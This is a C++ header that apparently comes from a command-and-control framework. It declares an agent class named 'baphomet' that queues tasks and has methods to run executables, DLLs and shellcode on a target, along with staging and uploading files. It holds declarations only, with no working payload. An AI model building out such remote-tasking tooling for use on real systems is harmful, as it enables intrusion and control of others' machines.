//
// Created by diago on 2024-04-25.
//

#ifndef AGENT_HPP
#define AGENT_HPP
#include "../../util/argument_parser.hpp"
#include "../base/base.hpp"

namespace lurch {
class baphomet final : public leaf {
private:
    std::queue<std::string> tasks;
    static accepted_commands commands;

public:

    result<std::string> runexe(const command& cmd);
    result<std::string> rundll(const command& cmd);
    result<std::string> runshellcode(const command& cmd);

    bool file_is_staged(const std::string& file_name) const;
    result<std::string> get_task() const;
    result<std::string> complete_task(const command& cmd);
    result<std::string> print_tasks() const;
    result<std::string> generic_queue_task(const command& cmd, std::vector<std::string> args, const std::string& queue_message);
    result<std::string> print_staged_files() const;

    static result<std::string> delimit_command(const std::vector<std::string>& strings);
    static void init_commands();

    result<std::filesystem::path> upload(const std::string &file, const std::string &extension) override;
    result<std::string> recieve(const lurch::command &cmd, bool& log_if_error) override;

    explicit baphomet(const std::optional<std::weak_ptr<owner>> &parent, instance* const root)
        : leaf(parent, root) {
    }
};

} // lurch

#endif //AGENT_HPP
